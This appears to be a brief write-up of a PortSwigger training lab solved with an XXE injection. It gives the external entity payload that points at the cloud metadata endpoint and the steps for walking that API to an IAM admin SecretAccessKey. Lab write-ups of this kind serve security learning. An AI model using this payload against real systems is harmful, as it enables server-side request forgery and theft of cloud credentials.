![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/dc36dec4-bfed-4015-9b0e-48037279e560)

### Solution

We went in to the website and checked stock

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/a72cc2b1-b63a-440f-900c-84cec6b903ca)

Insert the following external entity definition in between the XML declaration and the stockCheck element:

`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`

Replace the productId number with a reference to the external entity: &xxe;. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/6cbac6a6-6cfd-438f-a9d7-add86c598fa2)

Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin. This should return JSON containing the SecretAccessKey.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/cf5f1410-ccb8-4851-9334-4432743d07c6)

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/d974d059-8d1d-44b4-916a-baa850936640)

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/5e678c79-b59e-4e78-a35a-aeed2895457c)

lab solved succesfully

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/78a9bd0a-7f79-4c54-91e9-f408d7c3e00a)
